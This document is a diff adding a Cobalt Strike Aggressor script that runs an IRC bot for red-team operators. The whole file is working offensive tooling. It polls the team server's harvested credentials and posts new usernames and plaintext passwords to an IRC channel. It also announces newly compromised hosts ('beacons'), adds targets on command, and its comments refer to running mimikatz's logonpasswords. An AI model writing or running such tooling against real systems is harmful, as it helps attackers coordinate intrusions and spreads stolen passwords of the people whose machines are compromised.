@@ -1,0 +1,204 @@
+#Authors:
+# rsmudge: https://gist.github.com/rsmudge/c61683d57e94d04c862c - Base commands
+# Adam Luvshis <adam.m.luvshis@intel.com>
+
+global('%credentials');
+
+%credentials = %();
+
+#Get the initial credentials stored on the team server to compare against later. This is done as soon as the script executes / bot connects to server
+sub getCredentials {
+	$flag = $1; 		#init / new_cred_check
+	foreach $entry (credentials()) {
+		$host = $entry['host'];
+		$realm = $entry['realm'];
+		$user = $entry['user'];
+		$password = $entry['password'];
+		$source = $entry['source'];
+		$hostname = "";
+
+		@user_list = @();
+
+		$sizeof = size(keys(%credentials[$host]));
+		if($sizeof ne $null) {
+			foreach $key (keys(%credentials[$host])) {
+				push(@user_list, $key);
+			}
+		}
+
+		foreach $beacon (beacons()) {
+			if($host eq $beacon['internal']) {
+				$hostname = $beacon['computer'];
+			}
+		}
+
+		$check = iff($user in @user_list, "true", "false");
+		if($check eq "false") {
+			%credentials[$host][$user] = @($password);
+			if($flag eq "new_cred_check") {
+				$channel = "#red";
+				$msg = "\c4New account found on " . $hostname . " | IP: " . $host . " | Realm: " . $realm . " | Username: " . $user . " | Password : " . $password . " | Source: " . $source;
+				irc_msg($handle, $channel, $msg);
+			}
+		}
+		else if($check eq "true") {
+			if($password !isin %credentials[$host][$user]) {
+				push(%credentials[$host][$user], $password);
+				if($flag eq "new_cred_check") {
+					$channel = "#red";
+					$msg = "\c4New account found on " . $hostname . " | IP: " . $host . " | Realm: " . $realm . " | Username: " . $user . " | Password : " . $password . " | Source: " . $source;
+					irc_msg($handle, $channel, $msg);
+				}
+			}
+		}
+	}
+	#println(%credentials);
+}
+
+sub irc_close {
+	println($1, "QUIT :Good bye!");
+	closef($1);
+}
+
+# irc_join($handle, "#armitage");
+sub irc_join {
+	println($1, "JOIN $2");
+}
+
+# irc_msg($handle, "#red", "Hello World");
+sub irc_msg {
+	println($1, "PRIVMSG $2 : $+ $3");
+}
+
+sub irc_connect {
+	getCredentials("init");
+	local('$handle');
+
+	$handle = connect($1, $2);
+	fork({
+		local('$temp');
+		println($handle, "PASS PASSWORD");
+		println($handle, "USER a b c :Cobalt Strike Bot");
+		println($handle, "NICK $nick");
+
+		while $temp (readln($handle)) {
+			# keep this IRC connection alive
+			if ("PING*" iswm $temp) {
+				println($handle, "PONG " . substr($temp, 5));
+			}
+			# extract channel messages
+			else if ($temp ismatch ":(.*?)!.* PRIVMSG (#.*?) :(.*)") {
+				local('$from $channel $message');
+				($from $channel, $message) = matched();
+				fireEvent("irc_public", $handle, $from, $channel, $message);
+			}
+			# fire an event for everything else..
+			else {
+				fireEvent("irc_other", $handle, "$temp");
+			}
+		}
+	}, \$handle, $nick => $3);
+
+	return $handle;
+}
+
+#
+# example...
+#
+on irc_public {
+	local('$handle $from $channel $text');
+	($handle, $from, $channel, $text) = @_;
+	#println("< $from $+ : $+ channel $+ > $text");
+
+	if ($text eq "!beacons") {
+		foreach $beacon (beacons()) {
+			irc_msg($handle, $channel, "\c7$beacon");
+		}
+	}
+	else if ($text eq "!csusers") {
+		$listUsers = "";
+		$userListSize = size(users());
+		$i = 0;
+		foreach $user (users()) {
+			if($i < $userListSize) {
+				$listUsers .= $user . ", ";
+			}
+			else {
+				$listUsers .= $user;
+			}
+			$i++;
+		}
+		irc_msg($handle, $channel, "\c2Active CStrike Users: " . $listUsers);
+	}
+	else if($text hasmatch "!addtarget") {
+		@split = split(" ", $text);
+		if(size(@split) < 3 || size(@split) > 4) {
+			irc_msg($handle, $channel, "\c7Invalid number of arguments. Syntax is !addtarget ip_addr hostname operating_system");
+		}
+		else {
+			$ipAddr = @split[1];
+			$hostname = @split[2];
+			$os = @split[3];
+
+			host_update($ipAddr, $hostname, $os, $null, $null);
+
+			$msg = "\c7Added a new target with an IP Address: $ipAddr - Hostname: $hostname - OS: $os";
+
+			irc_msg($handle, $channel, $msg);
+		}
+	}
+	else if($text eq "!help") {
+		@commands = @("!beacons (outputs all beacon metadata)", "!csusers (lists users on CStrike Server)", 
+						"!help (this menu)", "!quit (makes bot disconnect)", "!addtarget ip host os (adds a new target to CStrike Server)");
+		$msg = "\c2Following commands are available:";
+		irc_msg($handle, $channel, $msg);
+
+		foreach $cmd (@commands) {
+			irc_msg($handle, $channel, "\c2$cmd");
+		}
+	}
+	else if ($text eq "!quit") {
+		irc_msg($handle, $channel, "Good bye!");
+		irc_close($handle);
+	}
+}
+
+on irc_other {
+	local('$handle $text');
+	($handle, $text) = @_;
+	#println($text);
+
+	# End of /MOTD command is a good time for an auto-join
+	if (":* 422 * :*" iswm $text) {
+		irc_join($handle, "#red");
+	}
+}
+
+
+on beacon_initial {
+	$beacon_id = $1;
+	$hostname = beacon_info($beacon_id, "computer");
+	$ipAddr = beacon_info($beacon_id, "host");
+	$user = beacon_info($beacon_id, "user");
+	$channel = "#red";
+
+	$msg = "\c4New beacon detected! Hostname: " . $hostname . " | IP Address: " . $ipAddr . " | User: " . $user;
+
+	irc_msg($handle, $channel, $msg);
+}
+
+#Check for logonpasswords command, if recently executed, check credentials again to see if anything new was found
+on beacon_tasked { 
+	$id = $1;
+	$output = $2;
+	$when = $3;
+
+	#println("$1 $2 $3");
+	#65058 Tasked beacon to run mimikatz's sekurlsa::logonpasswords command 1499470586447
+}
+
+on heartbeat_1m {
+	getCredentials("new_cred_check");
+}
+
+$handle = irc_connect("localhost", 6667, "CStrikeBot");
